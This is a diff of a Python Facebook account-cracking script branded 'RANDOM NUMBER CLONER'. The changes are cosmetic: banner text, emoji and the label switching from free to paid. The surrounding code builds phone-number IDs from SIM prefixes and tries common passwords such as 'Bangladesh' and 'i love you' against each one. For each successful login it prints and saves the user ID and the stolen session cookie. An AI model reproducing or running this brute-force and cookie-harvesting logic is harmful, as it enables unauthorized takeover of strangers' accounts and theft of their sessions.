@@ -161,14 +161,14 @@ def menu_apikey():
     ┌───────────────────────────────────────┐
     │ [✓] AUTHOR   : Saiko Haker 😈         │
     │ [✓] GITHUB   : JUBU the NOOB 💗       │
-    │ [✓] TYPE     : FREE,Frist Aproved     │
+    │ [✓] TYPE     : PAID$, PAID            │
     │ [✓] WHATSAPP : +8801834292903         │
     │ [✓] VERSION  :  0.1                   │
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
     └───────────────────────────────────────┘""")
   print(f"\t \033[1;32m NAMTA MONE RAKHBEN SAIKO HAKER JUBU 😈\033[1;37m ")
   print(f"")
-  print(f"\t \033[1;32m  SCRIPT TA AMAR NA SHAIN VAIR THAKA NISI\033[1;37m ")
+  print(f"\t \033[1;32m  FACEBOOK AR THAKA BASI WHATSAPP A PABAN\033[1;37m ")
   print(f"")
   print(f"\t \033[1;32m  FOllOW MY WHATSAPP NUMBER TO GET APPROVEL\033[1;37m ")
   print(f"")
@@ -220,7 +220,7 @@ logo=(f"""\x1b[1;97m
     ┌───────────────────────────────────────┐
     │ [✓] AUTHOR   : Saiko Haker 😈         │
     │ [✓] GITHUB   : JUBU the NOOB          │
-    │ [✓] TYPE     : FREE,Frist Aproved     │
+    │ [✓] TYPE     : PAID$, FREE            │
     │ [✓] WHATSAPP : +8801834****03         │
     │ [✓] VERSION  : 0.1                    │
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
@@ -341,20 +341,20 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [😸  Total ids:\033[1;92m '+tl)
-		print(f' [😸  Usaragents : '+str(len(ugen)))
-		print(f' [😸\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [😸  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[😸  The process has been started')
-		print(' [😸  use airplane mode if ok ids not come ')
+		print(' [😎  Total ids:\033[1;92m '+tl)
+		print(f' [😎  Usaragents : '+str(len(ugen)))
+		print(f' [😎\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [😎  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[😎  The process has been started')
+		print(' [😎  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [😸 Crack process has been completed')
-	print(' [😸 Ids saved in ok.txt,cp.txt')
+	print(' [😎 Crack process has been completed')
+	print(' [😎 Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def virus3():
@@ -504,7 +504,7 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [JUBU-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [JUBU-OK😘] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 oks.append(cid)
@@ -563,7 +563,7 @@ def c(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [SPY-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [JUBU-OK😘] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Numer : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
